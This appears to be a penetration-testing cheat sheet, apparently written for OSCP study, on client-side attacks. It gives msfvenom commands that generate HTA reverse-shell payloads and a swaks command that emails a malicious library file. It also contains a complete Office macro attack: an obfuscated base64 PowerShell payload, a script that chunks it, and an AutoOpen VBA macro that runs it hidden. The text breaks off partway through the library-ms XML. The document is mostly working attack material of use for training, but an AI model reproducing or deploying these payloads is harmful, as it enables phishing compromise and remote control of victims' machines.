# Client-Side Attacks

## information gathering

### exiftool

```bash
exiftool -a -u old.pdf
```

### gobuster

```bash
gobuster dir -u http://192.168.213.197/  -x pdf -w /usr/share/wordlists/dirb/common.txt
```

### canarytokens

<https://www.canarytokens.org/generate>

### wsgidav

```bash
~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/OSCP/course/Client-side_Attacks/webdav
```

### swaks

```bash
sudo swaks -t dave.wizard@supermagicorg.com --attach @config.Library-ms --server 192.168.213.199 --body @body.txt --header "Subject: config" --suppress-data -ap
```

## HTA

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.8.1 LPORT=4444 -f hta-psh -o shell.hta

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.221 LPORT=4444 -f hta-psh -o evil.hta
```

## Macro

### split.py

```python
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwAnACcAKwAnACcASQBBAEIAQQA0AE8AbQBZAEMAQQA3ADEAVwArADIALwBhAFMAQgBEACsAdgBWAEwALwBCADYAdABDAHMAaQAwAFIAWABxAEYATgBFADYAbgBTADIAVAB4AE4AYwBBAEkANABtAEEAQgBGADEAYwBaAGUAbQB3ADEAcgBMADEAMgB2AGUAZgBYADYAdgA5ADgAWQA3AEoAQwBvAHAATQBxAGQAMQBGAHMASgBZAGUALwBPAGEANwAvADUAWgBzAFoAZQBIAEQAcQBDAHMARgBEAGEAOABJADgAVgBTAC8AcgB4AC8AcAAyAFUAcgBoADcAaQBLAEoAQwBVADMATgAnACcAKwAnACcASgAyAG8AMgA5ADUASwBVAGMAYgBpADIAJwAnACsAJwAnADEAJwAnACsAJwAnAEoAUABaADcAbgBmAEUAcwB6AG0AOQBJAFgAUwBaAGwAcQB7ADEAfQAyAFcAZABCAFkAaQBFAHMANgB1AHIAVwBzAHcANQBEAHMAWABoAHYAZABEAEMAUQBvAHMAaQBIAEQAeABRAGcAaQBOAEYAbABmADYAVwBSAG4AUABNADgAZABuAHQAdwB7ADEAfQBOADIAaABQAFIARAB7ADEAfQBuADAAcgB0AEMAaAA3AFEARABRAFYAMgA5AGEAUQBNADgAZgBTAG0AUgBhADYAewAxAH0AVgBtAFgATwBTAGcASgByADIAQQB0AEsAUgBHAEsALwBQAFcAcgByAEUANwBQAHsAMQB9AHIATgBDADQAMwB1AE0AYQBLAFQASQAxAGoAWQBTAE8AQwBpADQAbABNAHEAcQA5AEYATgBOAEgATgA1AHQAbAAxAGkAUgBUAGUAJwAnACsAJwAnAEoAdwBGAGoARgBQAEYARQBZAGsAUABLADgAVQBoAG0ARwBFAFAASAB3AEQAMQBsAGIAWQB4AEcATABPADMARQBpAEcAMgB4AHoAdgB3ADcARwBJAGUAJwAnACsAJwAnAFoAaABlAEsANwBGAHoAawBGAEoAawBlAE8AeAB4ADUAbQBpAHUAewAxAH0AMwBFAFUAewAxAH0AWABsAHAAbQBuAGkAWQB6AG0AWgAvAEsAZABQAFUALwBTAEEATwBCAFEAbAB3AHcAUQBnAEYANQBtAHgAcABZAGIANABpAEQAbwA0AEsAYgBSAFMANgBGAEEAKwB3AE4AdwBNAHQAUwAzAEEAUwArAGoATgBWAEIAYgBFAFYAVwAyAEEAbABGADgAYQBVADUAcQBWAC8AWQAwAGEANQB3AGUAcwBNAHYATABjAHEASwBjACsAVgBRAEsAbwBuAHUASgBxAEgAeABKADYANgBxAE0AbgBjAG0ATwBLAEQAcQBuAHcAaQAwAGcATQBiAFYARgBoAFAAagBBAEEAUQBmAHsAMQB9AFkANABlAGgAbQBUAGEASABDAEMAUgBzAGUATgBiAEUAMwAzAEoAeABpAEMAVgBuAG8AcwBJAG4AdgBWAEwAMQBJAHAATAA1AG4AZwBIAFEAbgBHAHQALwBDAGEAdQArAE0AeABWAG0AZABQAGsARQBzADUAWQBlAFgAZgBhAHEAdQBjAEsAWQBJAGEAUQAwAEsARAByAGEAbgBOAGkARABzADcARwBuAGoAQgBnAE4AegA2AEkAaABGADUAbgBjADEAMQA3AEoARQBRADEANwBjAGgAQwBvAGkAVABFAFYAWQA1AGwAUgBQAHMAVQBiAHgASABvADUAQwBKADMAVQAnACcAKwAnACcAQgA4AGkAcAB3AGUAWQBMAGUATwBLAGYAYQBSAFMARQBCAE8AcQBQAEcATABXAGkATQBnADQAawBsAFgAagB3AGwAMQBNAGQAYwBjAHsAMQB9AEcAcwBFAFUAVQBIAEsAMQBaAGYAQgBIAFAASwBtAHsAMQB9AEUAWgBvADQAZwBDAGcATwA3AHcARABWADMATQBlAGwAQQBuAE8AcABOAFAAUwAyAEcAYgBlAGsAMwBjAFEAawBtAHMAVQBSAFYARgBlADYAcwBWAFEAcAAwADUAZQAnACcAKwAnACcAcwBqAEMAaQAyAE0AMQBMAFcAaABpAFIAOQBFAGkATABCAGQAcwAvAHsAMQB9AHMAZAB3AHoAWgBnAEsANABxAEIASQBaAE8AWgBtADYAZwBzAHcAVQA2AGMAMQBGAGsAYQBDAHgAdwA2AGsARgBBAEMANABzADUAYgBZAEkAWQBnAG0AZQBPAFMAbABOAG4ARwB4AHYAcgAnACcAKwAnACcAVwBJAG4AegBtAFgAVAA2AEoAUgBRADUAUgBDADcAWQBDAGwARgBXAFEARABkAGgASQBVAEwASgBFAFEAaABVAE8AYwBRAEEAcQAxAFkARwBGAGgAQgBFAHUASwBBADUARABZADkANAB3AG0AUgBUADUAMABpAEwAUQArADkAcgB4AEMAUABuAGIAbABrADAARgBtAE4AWABBAGcAZgBJAEoASgBCAHMAYQB6AEUAQwBIAFIARgBtAFUAaQBMADkAbQBFAEMAKwBnAC8AQwBiADQASgBzAGYANQBEAEIATAAvADIASABRAGkAbAB4AG4ARwBhAEYAQwBXAHIAcQBxAG0AKwBGAFEAbgB4AGMAJwAnACsAJwAnADUAdAAyAEoAUwBGAG4AaQBzADAAZQBDAFMANABBAGgAUwBaAG4AZwBZADQAaQAvAEsAbAA2ADYAQwAvAEsAaAArAEkAdABxAFcAbQB3AHgAawBaAEkAVABVAGQAZgBrAEwAJwAnACsAJwAnAEsAMgBKAG0AWABEAGgATgArAFEAbgBCAHUAcwBmAHUARgBlAGQAeAA3AGIAUgBWADcAZgB6AEQAMwBOAGkAQQB7ADEAfQB6ADMAYQB2ADMAMgArADMAcQBxAG0AUABaAFYAVwBFADEARABIAEgAZABNADQAVABaAHUASAA5ADgAdABMAFQAMgBZAEQAZwBXAEUAMABOAHIAMwA1AEgAUwBZAGwAegBkAEwAVAB0AGsAWgAzAFUAMQBkADcAdwBwAGYAdAByAHAAdQAzAFYASgAzACsAdwBlAGYAZABjAGIAMQB6ADMAUAB2AC8AQwBzAFEAZgBsAGoAawAzAFIASAB0AGIANQBlAHEAcQBCAHUAdgBSAEYAMwBSAC8AcABhAEwAMQBXAGoAQgBsAG0AMwArADIAVABZAFgAMwBTAGEANABtAEYAcwBVAHoAVAAwAGkAdgA1ADkAKwBSAEsAUgBUAFoAYwAvADIAbQBWAG0ANwBnAHgATgBhADgAMwBQAG4AVgAzAEgAcwAxAHQAegAwADkAMgBPADIAOABYAEwAVQBYAFcAaABOAFQAUwB0AEYAagBiAHMAcABzADYAdQB4AHoAcgBYAGUAawBWADcAMgBOAFQANwB3ADQAYgBlADcAOABQAGUASgA3AC8AbwBWAFcARwBQAFYAbABnAFQAbQBUAFgAVwBkAGMAdABNADgANwBYAEIAdgBSACcAJwArACcAJwBFAEcAYQBLADYAJwAnACsAJwAnAFAANwBBAHEAWgBMAE8AOABIAGMANwBEAFYAaABCAEQATQBZAHEAbABxAHUASABqAEQAUABuAGQASAB4AEYANABWAGIAZABTADYARQBSAE8AdAAxAHEAbQBXADMAWAB0ADcAMQA2ADYAZwBlAFcAZABpAHgAOQAzAEwAUwBlAFEAMgBPAHYAVwAxAHIAbwAzAEwAagBZADUAZQBiADIAbQBOAHcAWABEAFkAbgBJAHoAcwB4AFcAUgAwAFIAewAxAH0AZQBqAFkAWABuAEMAcwBMAE0AdQB6AHMARQBHAHcAZgBxAHQAdgBYAGcAbwBtAGkAMwBmAG0ARwAvAEsAUAB2AGkANgAyAE4AcwBQAFMARQAnACcAKwAnACcAQQBmAEsAbQA3AHgAYwB2AGgAWgBEADkAZgBYAGYAbQAvAGwAdQAvADMAUgB4AFcAQgB6ACcAJwArACcAJwBzADMAMgBvAE0ARwAxAFkATABOAG8AZgBJAE4AZgBUAEkAUQBuAEYAZQBRAFgAUwBQAE8AZwBuAFgAZgBEADkAdQA5AHoAdQBZADcAaAA5AGwAdgBIAFgAMgByAHsAMQB9AEoAZQBEAFIASABGAEoAZwBBADcAVABzAHIAeABDAGIAagB6AGIAUQBkADkAeABoAEoATgBCAFQAbABNAE8AQQBYAG0ASQBlAFkAdwAnACcAKwAnACcAagB7ADEAfQBFAGkAWgBuAFIAVwBLAE8AVQBPAGMAbABJAGcATQA0AE4AdwAnACcAKwAnACcAKwBnAHcASQBwAEsASgBOAFQAVAAyAFEAWgAxADYAVQBxAFUAbgBRAGYAVQA0AEoANwBLAHQAcQA2AHMASgBCAEEAbABsAEEAYQB3AHQAZABIAEgAbwBpADMAbQArAHQARABrAHYAbABhAEMAOQBsAHoAYQBsADYAcgA0AEEAMwBuADYAegBHAGwAdAB1AGwAYwBSAFcAUABwAGsAUABlADIAUgBTADIAMwBSAHYARwA4AHcAUgBUADEASwBVAC8AdwBFAHIAKwBCAEkAUQAwAEoAUgBlAFEAKwBzADEANABNAEQAMQBBAHIAbwBJAHQATABSAEQAZABTAGYAdwA2AFkAegBSADUAJwAnACsAJwAnACsAQwBsADkAegBwAFMANABZAGcAZABnAEYAYQBHAG0AMAArACcAJwArACcAJwBUAFQANABDAEUASQBxAEIALwBoAHIAOQBEADEAMABtAG0ANAAvAE4AcABtAHsAMQB9AE0AVAAvAFEAKwBUAEoAbQAxAFMAYwAvAGgAegBmADAAKwBhADQAOQA1AHYAVAB0ADkARQBwAEYATAArAEEATQA0AHYAMgB7ADEAfQA4ADMAbgBuAFgAMgBQADQAbgBBAEMAQgBFAEIAbwBoAFoAMABXADQAbwBQAGcALwA4AFUARQBHAG0AaABQAEUAcwB3AEoAQQBmAEsAdwBFAHQAWAA4AGoAVgA4AEcANAB1AHoARwAvAGkAMgAyAG4AZgA3AGYAdwBDAFcATQB1ADAARABqAEEAcwBBAEEAQQB7ADAAfQB7ADAAfQAnACcAKQAtAGYAJwAnAD0AJwAnACwAJwAnAHkAJwAnACkAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

### vba

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
    Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
    Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
    Str = Str + "wBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcAB"
    Str = Str + "vAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9A"
    Str = Str + "E4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQ"
    Str = Str + "AaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAU"
    Str = Str + "wB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQB"
    Str = Str + "tAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9A"
    Str = Str + "CcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACA"
    Str = Str + "AJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAc"
    Str = Str + "gBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB"
    Str = Str + "5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkA"
    Str = Str + "GUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGU"
    Str = Str + "AbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAe"
    Str = Str + "gBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQB"
    Str = Str + "jAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5A"
    Str = Str + "FMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4"
    Str = Str + "AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAd"
    Str = Str + "AByAGkAbgBnACgAKAAoACcAJwBIADQAcwAnACcAKwAnACcASQB"
    Str = Str + "BAEIAQQA0AE8AbQBZAEMAQQA3ADEAVwArADIALwBhAFMAQgBEA"
    Str = Str + "CsAdgBWAEwALwBCADYAdABDAHMAaQAwAFIAWABxAEYATgBFADY"
    Str = Str + "AbgBTADIAVAB4AE4AYwBBAEkANABtAEEAQgBGADEAYwBaAGUAb"
    Str = Str + "QB3ADEAcgBMADEAMgB2AGUAZgBYADYAdgA5ADgAWQA3AEoAQwB"
    Str = Str + "vAHAATQBxAGQAMQBGAHMASgBZAGUALwBPAGEANwAvADUAWgBzA"
    Str = Str + "FoAZQBIAEQAcQBDAHMARgBEAGEAOABJADgAVgBTAC8AcgB4AC8"
    Str = Str + "AcAAyAFUAcgBoADcAaQBLAEoAQwBVADMATgAnACcAKwAnACcAS"
    Str = Str + "gAyAG8AMgA5ADUASwBVAGMAYgBpADIAJwAnACsAJwAnADEAJwA"
    Str = Str + "nACsAJwAnAEoAUABaADcAbgBmAEUAcwB6AG0AOQBJAFgAUwBaA"
    Str = Str + "GwAcQB7ADEAfQAyAFcAZABCAFkAaQBFAHMANgB1AHIAVwBzAHc"
    Str = Str + "ANQBEAHMAWABoAHYAZABEAEMAUQBvAHMAaQBIAEQAeABRAGcAa"
    Str = Str + "QBOAEYAbABmADYAVwBSAG4AUABNADgAZABuAHQAdwB7ADEAfQB"
    Str = Str + "OADIAaABQAFIARAB7ADEAfQBuADAAcgB0AEMAaAA3AFEARABRA"
    Str = Str + "FYAMgA5AGEAUQBNADgAZgBTAG0AUgBhADYAewAxAH0AVgBtAFg"
    Str = Str + "ATwBTAGcASgByADIAQQB0AEsAUgBHAEsALwBQAFcAcgByAEUAN"
    Str = Str + "wBQAHsAMQB9AHIATgBDADQAMwB1AE0AYQBLAFQASQAxAGoAWQB"
    Str = Str + "TAE8AQwBpADQAbABNAHEAcQA5AEYATgBOAEgATgA1AHQAbAAxA"
    Str = Str + "GkAUgBUAGUAJwAnACsAJwAnAEoAdwBGAGoARgBQAEYARQBZAGs"
    Str = Str + "AUABLADgAVQBoAG0ARwBFAFAASAB3AEQAMQBsAGIAWQB4AEcAT"
    Str = Str + "ABPADMARQBpAEcAMgB4AHoAdgB3ADcARwBJAGUAJwAnACsAJwA"
    Str = Str + "nAFoAaABlAEsANwBGAHoAawBGAEoAawBlAE8AeAB4ADUAbQBpA"
    Str = Str + "HUAewAxAH0AMwBFAFUAewAxAH0AWABsAHAAbQBuAGkAWQB6AG0"
    Str = Str + "AWgAvAEsAZABQAFUALwBTAEEATwBCAFEAbAB3AHcAUQBnAEYAN"
    Str = Str + "QBtAHgAcABZAGIANABpAEQAbwA0AEsAYgBSAFMANgBGAEEAKwB"
    Str = Str + "3AE4AdwBNAHQAUwAzAEEAUwArAGoATgBWAEIAYgBFAFYAVwAyA"
    Str = Str + "EEAbABGADgAYQBVADUAcQBWAC8AWQAwAGEANQB3AGUAcwBNAHY"
    Str = Str + "ATABjAHEASwBjACsAVgBRAEsAbwBuAHUASgBxAEgAeABKADYAN"
    Str = Str + "gBxAE0AbgBjAG0ATwBLAEQAcQBuAHcAaQAwAGcATQBiAFYARgB"
    Str = Str + "oAFAAagBBAEEAUQBmAHsAMQB9AFkANABlAGgAbQBUAGEASABDA"
    Str = Str + "EMAUgBzAGUATgBiAEUAMwAzAEoAeABpAEMAVgBuAG8AcwBJAG4"
    Str = Str + "AdgBWAEwAMQBJAHAATAA1AG4AZwBIAFEAbgBHAHQALwBDAGEAd"
    Str = Str + "QArAE0AeABWAG0AZABQAGsARQBzADUAWQBlAFgAZgBhAHEAdQB"
    Str = Str + "jAEsAWQBJAGEAUQAwAEsARAByAGEAbgBOAGkARABzADcARwBuA"
    Str = Str + "GoAQgBnAE4AegA2AEkAaABGADUAbgBjADEAMQA3AEoARQBRADE"
    Str = Str + "ANwBjAGgAQwBvAGkAVABFAFYAWQA1AGwAUgBQAHMAVQBiAHgAS"
    Str = Str + "ABvADUAQwBKADMAVQAnACcAKwAnACcAQgA4AGkAcAB3AGUAWQB"
    Str = Str + "MAGUATwBLAGYAYQBSAFMARQBCAE8AcQBQAEcATABXAGkATQBnA"
    Str = Str + "DQAawBsAFgAagB3AGwAMQBNAGQAYwBjAHsAMQB9AEcAcwBFAFU"
    Str = Str + "AVQBIAEsAMQBaAGYAQgBIAFAASwBtAHsAMQB9AEUAWgBvADQAZ"
    Str = Str + "wBDAGcATwA3AHcARABWADMATQBlAGwAQQBuAE8AcABOAFAAUwA"
    Str = Str + "yAEcAYgBlAGsAMwBjAFEAawBtAHMAVQBSAFYARgBlADYAcwBWA"
    Str = Str + "FEAcAAwADUAZQAnACcAKwAnACcAcwBqAEMAaQAyAE0AMQBMAFc"
    Str = Str + "AaABpAFIAOQBFAGkATABCAGQAcwAvAHsAMQB9AHMAZAB3AHoAW"
    Str = Str + "gBnAEsANABxAEIASQBaAE8AWgBtADYAZwBzAHcAVQA2AGMAMQB"
    Str = Str + "GAGsAYQBDAHgAdwA2AGsARgBBAEMANABzADUAYgBZAEkAWQBnA"
    Str = Str + "G0AZQBPAFMAbABOAG4ARwB4AHYAcgAnACcAKwAnACcAVwBJAG4"
    Str = Str + "AegBtAFgAVAA2AEoAUgBRADUAUgBDADcAWQBDAGwARgBXAFEAR"
    Str = Str + "ABkAGgASQBVAEwASgBFAFEAaABVAE8AYwBRAEEAcQAxAFkARwB"
    Str = Str + "GAGgAQgBFAHUASwBBADUARABZADkANAB3AG0AUgBUADUAMABpA"
    Str = Str + "EwAUQArADkAcgB4AEMAUABuAGIAbABrADAARgBtAE4AWABBAGc"
    Str = Str + "AZgBJAEoASgBCAHMAYQB6AEUAQwBIAFIARgBtAFUAaQBMADkAb"
    Str = Str + "QBFAEMAKwBnAC8AQwBiADQASgBzAGYANQBEAEIATAAvADIASAB"
    Str = Str + "RAGkAbAB4AG4ARwBhAEYAQwBXAHIAcQBxAG0AKwBGAFEAbgB4A"
    Str = Str + "GMAJwAnACsAJwAnADUAdAAyAEoAUwBGAG4AaQBzADAAZQBDAFM"
    Str = Str + "ANABBAGgAUwBaAG4AZwBZADQAaQAvAEsAbAA2ADYAQwAvAEsAa"
    Str = Str + "AArAEkAdABxAFcAbQB3AHgAawBaAEkAVABVAGQAZgBrAEwAJwA"
    Str = Str + "nACsAJwAnAEsAMgBKAG0AWABEAGgATgArAFEAbgBCAHUAcwBmA"
    Str = Str + "HUARgBlAGQAeAA3AGIAUgBWADcAZgB6AEQAMwBOAGkAQQB7ADE"
    Str = Str + "AfQB6ADMAYQB2ADMAMgArADMAcQBxAG0AUABaAFYAVwBFADEAR"
    Str = Str + "ABIAEgAZABNADQAVABaAHUASAA5ADgAdABMAFQAMgBZAEQAZwB"
    Str = Str + "XAEUAMABOAHIAMwA1AEgAUwBZAGwAegBkAEwAVAB0AGsAWgAzA"
    Str = Str + "FUAMQBkADcAdwBwAGYAdAByAHAAdQAzAFYASgAzACsAdwBlAGY"
    Str = Str + "AZABjAGIAMQB6ADMAUAB2AC8AQwBzAFEAZgBsAGoAawAzAFIAS"
    Str = Str + "AB0AGIANQBlAHEAcQBCAHUAdgBSAEYAMwBSAC8AcABhAEwAMQB"
    Str = Str + "XAGoAQgBsAG0AMwArADIAVABZAFgAMwBTAGEANABtAEYAcwBVA"
    Str = Str + "HoAVAAwAGkAdgA1ADkAKwBSAEsAUgBUAFoAYwAvADIAbQBWAG0"
    Str = Str + "ANwBnAHgATgBhADgAMwBQAG4AVgAzAEgAcwAxAHQAegAwADkAM"
    Str = Str + "gBPADIAOABYAEwAVQBYAFcAaABOAFQAUwB0AEYAagBiAHMAcAB"
    Str = Str + "zADYAdQB4AHoAcgBYAGUAawBWADcAMgBOAFQANwB3ADQAYgBlA"
    Str = Str + "DcAOABQAGUASgA3AC8AbwBWAFcARwBQAFYAbABnAFQAbQBUAFg"
    Str = Str + "AVwBkAGMAdABNADgANwBYAEIAdgBSACcAJwArACcAJwBFAEcAY"
    Str = Str + "QBLADYAJwAnACsAJwAnAFAANwBBAHEAWgBMAE8AOABIAGMANwB"
    Str = Str + "EAFYAaABCAEQATQBZAHEAbABxAHUASABqAEQAUABuAGQASAB4A"
    Str = Str + "EYANABWAGIAZABTADYARQBSAE8AdAAxAHEAbQBXADMAWAB0ADc"
    Str = Str + "AMQA2ADYAZwBlAFcAZABpAHgAOQAzAEwAUwBlAFEAMgBPAHYAV"
    Str = Str + "wAxAHIAbwAzAEwAagBZADUAZQBiADIAbQBOAHcAWABEAFkAbgB"
    Str = Str + "JAHoAcwB4AFcAUgAwAFIAewAxAH0AZQBqAFkAWABuAEMAcwBMA"
    Str = Str + "E0AdQB6AHMARQBHAHcAZgBxAHQAdgBYAGcAbwBtAGkAMwBmAG0"
    Str = Str + "ARwAvAEsAUAB2AGkANgAyAE4AcwBQAFMARQAnACcAKwAnACcAQ"
    Str = Str + "QBmAEsAbQA3AHgAYwB2AGgAWgBEADkAZgBYAGYAbQAvAGwAdQA"
    Str = Str + "vADMAUgB4AFcAQgB6ACcAJwArACcAJwBzADMAMgBvAE0ARwAxA"
    Str = Str + "FkATABOAG8AZgBJAE4AZgBUAEkAUQBuAEYAZQBRAFgAUwBQAE8"
    Str = Str + "AZwBuAFgAZgBEADkAdQA5AHoAdQBZADcAaAA5AGwAdgBIAFgAM"
    Str = Str + "gByAHsAMQB9AEoAZQBEAFIASABGAEoAZwBBADcAVABzAHIAeAB"
    Str = Str + "DAGIAagB6AGIAUQBkADkAeABoAEoATgBCAFQAbABNAE8AQQBYA"
    Str = Str + "G0ASQBlAFkAdwAnACcAKwAnACcAagB7ADEAfQBFAGkAWgBuAFI"
    Str = Str + "AVwBLAE8AVQBPAGMAbABJAGcATQA0AE4AdwAnACcAKwAnACcAK"
    Str = Str + "wBnAHcASQBwAEsASgBOAFQAVAAyAFEAWgAxADYAVQBxAFUAbgB"
    Str = Str + "RAGYAVQA0AEoANwBLAHQAcQA2AHMASgBCAEEAbABsAEEAYQB3A"
    Str = Str + "HQAZABIAEgAbwBpADMAbQArAHQARABrAHYAbABhAEMAOQBsAHo"
    Str = Str + "AYQBsADYAcgA0AEEAMwBuADYAegBHAGwAdAB1AGwAYwBSAFcAU"
    Str = Str + "ABwAGsAUABlADIAUgBTADIAMwBSAHYARwA4AHcAUgBUADEASwB"
    Str = Str + "VAC8AdwBFAHIAKwBCAEkAUQAwAEoAUgBlAFEAKwBzADEANABNA"
    Str = Str + "EQAMQBBAHIAbwBJAHQATABSAEQAZABTAGYAdwA2AFkAegBSADU"
    Str = Str + "AJwAnACsAJwAnACsAQwBsADkAegBwAFMANABZAGcAZABnAEYAY"
    Str = Str + "QBHAG0AMAArACcAJwArACcAJwBUAFQANABDAEUASQBxAEIALwB"
    Str = Str + "oAHIAOQBEADEAMABtAG0ANAAvAE4AcABtAHsAMQB9AE0AVAAvA"
    Str = Str + "FEAKwBUAEoAbQAxAFMAYwAvAGgAegBmADAAKwBhADQAOQA1AHY"
    Str = Str + "AVAB0ADkARQBwAEYATAArAEEATQA0AHYAMgB7ADEAfQA4ADMAb"
    Str = Str + "gBuAFgAMgBQADQAbgBBAEMAQgBFAEIAbwBoAFoAMABXADQAbwB"
    Str = Str + "QAGcALwA4AFUARQBHAG0AaABQAEUAcwB3AEoAQQBmAEsAdwBFA"
    Str = Str + "HQAWAA4AGoAVgA4AEcANAB1AHoARwAvAGkAMgAyAG4AZgA3AGY"
    Str = Str + "AdwBDAFcATQB1ADAARABqAEEAcwBBAEEAQQB7ADAAfQB7ADAAf"
    Str = Str + "QAnACcAKQAtAGYAJwAnAD0AJwAnACwAJwAnAHkAJwAnACkAKQA"
    Str = Str + "pACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByA"
    Str = Str + "GUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0"
    Str = Str + "AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAK"
    Str = Str + "QAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwA"
    Str = Str + "uAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmA"
    Str = Str + "GEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGE"
    Str = Str + "AbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJ"
    Str = Str + "ABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZAB"
    Str = Str + "kAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuA"
    Str = Str + "GQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGU"
    Str = Str + "AbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZ"
    Str = Str + "QBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

## Windows Library Files

### config.library-ms

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
